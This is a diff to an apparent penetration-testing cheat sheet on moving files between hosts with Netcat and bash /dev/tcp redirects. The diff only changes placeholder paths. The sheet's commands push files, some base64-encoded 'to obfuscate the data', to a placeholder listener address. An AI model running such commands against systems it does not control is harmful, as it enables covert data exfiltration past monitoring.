@@ -13,7 +13,7 @@
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
-nc -lp %ListeningPort% > file.ext
+nc -lp %ListeningPort% > /path/to/store/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Windows host run the following in PowerShell:
@@ -28,7 +28,7 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
-nc -lp %ListeningPort% | base64 -d > file.ext
+nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Windows host run the following in PowerShell:
@@ -38,6 +38,8 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 ```
 
 ###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
+
+
 
 ***
 ***
@@ -51,19 +53,19 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
-nc -lp port > file.ext
+nc -lp port > /path/to/store/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
 
 ```
-nc -q 0 %ListenerAddress% %ListeningPort% < file.ext
+nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
 
 ```
-cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
@@ -71,19 +73,19 @@ cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
-nc -lp %ListeningPort% | base64 -d > file.ext
+nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
 
 ```
-base64 -w0 file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
+base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
 
 ```
-base64 -w0 file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
 ***
@@ -95,13 +97,13 @@ base64 -w0 file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
-nc -q 0 -lp %ListenerPort% < file.ext
+nc -q 0 -lp %ListenerPort% < /path/to/sending/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
 
 ```
-nc %ListenerAddress% %ListeningPort% > file.ext
+nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
@@ -115,13 +117,13 @@ nc %ListenerAddress% %ListeningPort% > file.ext
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on Linux host:
 
 ```
-base64 -w0 file.ext | nc -q 0 -lp %ListeningPort%
+base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with Netcat:
 
 ```
-nc %ListenerAddress% %ListeningPort% | base64 -d > file.ext
+nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 ```
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the Linux client connect back with bash:
